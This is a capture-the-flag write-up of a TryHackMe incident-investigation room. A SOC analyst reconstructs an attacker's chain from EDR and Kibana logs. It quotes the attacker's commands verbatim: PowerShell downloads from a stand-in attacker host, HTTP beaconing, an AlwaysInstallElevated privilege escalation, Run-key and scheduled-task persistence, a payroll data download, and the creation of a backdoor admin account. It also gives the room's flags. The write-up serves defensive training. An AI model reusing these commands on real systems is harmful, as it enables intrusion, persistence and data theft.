Original Notes

Servidae (THM)

Scenario

*Bill Smith, a senior Finance Executive at Servidae Industries, stated that he received an email from an unknown sender containing a PDF file attachment that required his action. At first glance, this email appeared legitimate, and he downloaded and opened it without any suspicion. After some time, Bill noticed his computer was acting abnormally and contacted IT Support, claiming that his workstation was slow and freezing up intermittently. Soon after, security alerts indicated suspicious network activity and unauthorized commands executed on Bill's workstation.*

A copy of the security alert from the organization's Endpoint Detection & Response (EDR) solution reads:

*This is an automated security alert generated by EndDefender EDR. Suspicious network activity and potential remote access were detected on workstation SERVIDAE-BOB-FIN-04 within the specified time range of: May 11, 2023 @ 18:45:00.000 to May 11, 2023 @ 19:01:00.000.*

*As a SOC Analyst at Servidae Industries, it's up to you to investigate the security alert by reviewing the logs to identify the cause and nature of the suspicious activity on Bill's computer. Fortunately, the organization recently implemented an Elastic Stack solution, and an Elastic Agent was installed to collect logs from Bill's workstation. We have access to the Kibana dashboard, which contains logs from the time of the incident. Let's walk through the investigation and determine if there were any signs of account compromise or malicious user activity.*

https://tryhackme.com/room/servidae

From the scenario, we know that Bill Smith (user bsmith) opened a malicious file from a phishing email, now his computer is behaving strangely and there are alerts for suspicious network activity so I started the investigation by filtering events for this user and looking for commands.

I started the investigation by searching process events that had a command line (process.command_line: exists) and filtered by the user. That returned several events that all looked malicious. I followed them in chronological order and documented what I saw and what it means.

powershell -c Invoke-WebRequest -Uri "http://evilparrot.thm/adminshell.msi" -OutFile "adminshell.mist"

Downloaded adminshell.msi from the attacker server (saved as adminshell.mist — likely renamed to evade detection). This file is later used as an MSI payload for privilege escalation/persistence.

powershell -c Invoke-WebRequest -Uri "http://evilparrot.thm/beacon.bat" -OutFile "beacon.bat"

Downloaded beacon.bat from the attacker server likely a C2 beacon script used to phone home and receive commands.

Next, I looked past the PowerShell downloads for other logs and saw the attacker perform discovery commands (typical post-exploitation recon): whoami, hostname, ipconfig, netstat, tasklist. These confirm the attacker was gathering system and network context.

Shortly after the second PowerShell download, winPEAS.exe was executed (the file was downloaded earlier).

winPEAS is an escalation-enumeration tool attacker used it to identify local privilege escalation opportunities.

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Checked the AlwaysInstallElevated policy a common misconfiguration that allows MSI installs to run with elevated privileges.

msiexec.exe /i C:\Users\bsmith\Desktop\adminshell.msi

Executed the MSI with msiexec this is the step that attempts to gain elevated code execution if AlwaysInstallElevated is set.

I then observed a download and execution of mimikatz. mimikatz was run to dump credentials. Around this time I also saw two COM/host executions that I couldn’t immediately classify (possible benign COM hosts or suspicious misuse):

C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}

C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding

These could be legitimate COM activations or abused for code execution collect full command lines, parent PIDs and image paths to decide.

curl http://beacon.thm?THM{C4N_y0U_h34r_m3}

Observed beaconing via HTTP GET to beacon.thm with a flag confirms C2 communication or beacon checks.

Persistence modifications were observed next:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "BackdoorShell" /t REG_SZ /d "C:\Users\bsmith\Desktop\adminshell.msi" /f

Added a Run key to start adminshell.msi at user logon persistent backdoor/auto-start.

schtasks /create /tn "Beacon" /tr "C:\Users\bsmith\Desktop\beacon.bat" /sc minute /mo 1 /ru "System"

Created a scheduled task named Beacon that runs beacon.bat every minute as System high privilege scheduled persistence and frequent beaconing.

After persistence was in place, the attacker interacted with the internal payroll site:

ping payroll.servidae.internal

Checked reachability of the internal payroll host.

curl -X POST -d "username=bsmith&password=Password123!&submit=submit&THM{1m_1N_Y0ur_P4YR0LL}" http://payroll.servidae.internal

Logged in or submitted credentials to the payroll site using Bill’s credentials indicates account misuse.

curl -X POST -d "username=bsmith&password=Password123!&submit=submit&THM{1m_1N_Y0ur_P4YR0LL}" -b "PHPSESSID=dt5qhq423goknmq269rg1tal1a" http://payroll.servidae.internal/employee-payroll.php

Repeated POST including a session cookie attacker reused a valid session to access restricted pages.

curl http://payroll.servidae.internal/bank-details/bank-details.csv -o C:\Users\bsmith\Desktop\bank-details.csv

Downloaded sensitive payroll data to the desktop confirmed local data access / exfil preparation.

After they gained elevated access (SYSTEM context observed), the attacker created a persistent local admin account:

C:\Windows\system32\net1 user backdoor backdoor /add /expires:never /passwordchg:no

Created local user backdoor with password backdoor — persistent account that won’t expire or require password change.

C:\Windows\system32\net1 localgroup Administrators backdoor /add

Added the backdoor account to the Administrators group — gives it full local admin rights.

C:\Windows\SYSTEM32\cmd.exe /c "C:\Users\bsmith\Desktop\beacon.bat"

Executed the beacon as SYSTEM — confirms scheduled task or manual execution under SYSTEM context.

Throughout the chain I observed indicators of typical attacker workflow: initial user-initiated PowerShell download → reconnaissance (winPEAS, discovery commands) → privilege escalation attempt (MSI + AlwaysInstallElevated) → credential dumping (Mimikatz) → establishing C2 beacon and persistence (Run key + scheduled task) → data access/exfil (payroll site, download CSV) → creation of persistent admin backdoor account.
